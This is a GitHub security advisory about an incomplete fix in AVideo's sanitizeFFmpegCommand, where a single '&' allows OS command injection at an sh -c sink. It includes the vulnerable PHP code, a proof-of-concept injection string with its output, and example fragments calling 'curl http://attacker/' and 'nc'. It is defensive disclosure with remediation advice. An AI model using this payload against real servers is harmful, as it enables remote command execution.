# [H] AVideo has an incomplete fix of CVE-2026-33482: sanitizeFFmpegCommand still allows a single '&' (background operator), giving OS command execution at the same execAsync sh -c sink

## Summary
Severity: High
Advisory: GHSA-wc3f-xc32-435f
CVE: CVE-2026-55173
CWE: CWE-78
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-06-23
Source: https://github.com/advisories/GHSA-wc3f-xc32-435f
Type: github-advisory

## Affected
- Packagist: `wwbn/avideo` — affected >=0

## Details
### Summary

The fix for CVE-2026-33482 (GHSA-pmj8-r2j7-xg6c) is incomplete. That advisory reported that `sanitizeFFmpegCommand()` (`plugin/API/standAlone/functions.php`) failed to strip `$(...)` command substitution, allowing OS command injection at the `execAsync()` `sh -c` sink. The fix (commit `25c8ab90`) added `$`, `(`, `)`, `{`, `}`, `\n`, `\r` to the denylist character class and a `str_replace('&&', '', ...)`. It still does **not** neutralize a single `&` (the shell background operator), which remains a command separator at the unchanged sink. Same entry point, same sink, same impact as the original — only the surviving metacharacter differs.

Verified at master HEAD.

### The surviving gap

HEAD `sanitizeFFmpegCommand` (`functions.php`):
```php
$command = str_replace('&&', '', $command);                    // only the doubled form
$command = preg_replace('/\s*&?>.*(?:2>&1)?/', '', $command);  // strips '&' only when followed by '>'
$command = preg_replace('/[;|`<>$()\n\r{}]/', '', $command);   // char class has no '&'
// then requires the result to start with 'ffmpeg'
```
A single `&` is therefore preserved. `ffmpeg ... & <cmd>` passes the sanitizer and the `strpos(trim($command),'ffmpeg')===0` prefix gate.

### Sink (unchanged)

`plugin/API/standAlone/ffmpeg.json.php:418` -> `execAsync($ffmpegCommand, $keyword)`. In `objects/functionsExec.php::execAsync`:
```php
$command = addcslashes($command, '"');   // line 686 — escapes only the double-quote
$commandWithKeyword = "nohup sh -c \"$command & echo \\$! > /tmp/$keyword.pid\" > /dev/null 2>&1 &";  // line 705
exec($commandWithKeyword, ...);          // line 712 — PHP exec() runs via /bin/sh -c
```
The sanitized command is embedded inside an inner `sh -c "..."`. A bare `&` in `$command` separates commands for that inner shell, so the injected command executes. `addcslashes` escaping only `"` does not stop `&`.

### Reachability

`ffmpeg.json.php` builds the command from `_decryptString(getInput('codeToExecEncrypted'))`. This is the **same** threat model the original advisory accepted (“an attacker who can craft a valid encrypted payload can achieve arbitrary command execution on the standalone encoder server”) and the same CVSS basis (`AV:N/AC:H/PR:N`).

### Proof (poc/poc_ampersand_bypass.php, poc/OUTPUT.txt)

Byte-faithful PHP harness: `sanitizeFFmpegCommand` copied verbatim from HEAD + the `execAsync` `sh -c` wrapping copied from `functionsExec.php`:
```
attacker input : ffmpeg -i input.mp4 & touch /tmp/avideo_amp_rce_proof & echo done out.mp4
after sanitize : ffmpeg -i input.mp4 & touch /tmp/avideo_amp_rce_proof & echo done out.mp4
ampersand survived : YES   passes prefix : YES
final sh -c string:
  nohup sh -c "ffmpeg -i input.mp4 & touch /tmp/avideo_amp_rce_proof & echo $! > /tmp/testkw.pid" > /dev/null 2>&1 &
>> injected touch executed: YES (/tmp/avideo_amp_rce_proof)
```
The sanitizer leaves `&` intact and the injected `touch` runs at the sink.

### Impact

Arbitrary OS command execution on the standalone encoder server, identical to CVE-2026-33482. Multiple `&`-separated commands can be chained (e.g. download + execute). Redirect-based payloads are blocked by the `>` strip, but command execution (e.g. `& curl http://attacker/...`, `& nc ...`, dropping/running a file) is not.

### Remediation

Stop applying a metacharacter denylist to a `sh -c` sink. Build the ffmpeg invocation as an argv array with `escapeshellarg()` per token (the project already uses `escapeshellarg()` at 137 sites) instead of interpolating `$command` into `sh -c "..."`. If the denylist is kept as defense-in-depth, add `&` to the stripped set — but the denylist approach has now missed two metacharacters in a row (`$()` then `&`).

## References
- https://github.com/WWBN/AVideo/security/advisories/GHSA-wc3f-xc32-435f
- https://github.com/WWBN/AVideo/commit/c1cfa2bea8a351a1d07f5758f82887403e3abf1f
- https://github.com/WWBN/AVideo
